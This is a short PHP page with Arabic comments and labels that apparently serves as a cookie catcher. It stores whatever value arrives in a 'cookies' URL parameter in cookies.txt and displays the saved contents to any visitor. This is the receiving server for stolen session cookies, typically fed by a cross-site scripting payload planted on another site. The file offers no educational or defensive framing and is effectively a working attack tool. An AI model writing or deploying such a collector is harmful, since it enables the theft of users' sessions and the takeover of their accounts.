

<?php
if (isset($_GET['cookies'])) {
    // حفظ الكوكيز في ملف نصي
    file_put_contents('cookies.txt', $_GET['cookies']);
}
?>

<!DOCTYPE html>
<html lang="ar">
<head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>عرض الكوكيز</title>
</head>
<body>
    <h1>الكوكيز المحفوظة</h1>
    <pre>
        <?php
        // عرض الكوكيز المحفوظة
        if (file_exists('cookies.txt')) {
            echo htmlspecialchars(file_get_contents('cookies.txt'));
        } else {
            echo "لا توجد كوكيز محفوظة.";
        }
        ?>
    </pre>
</body>

</html>
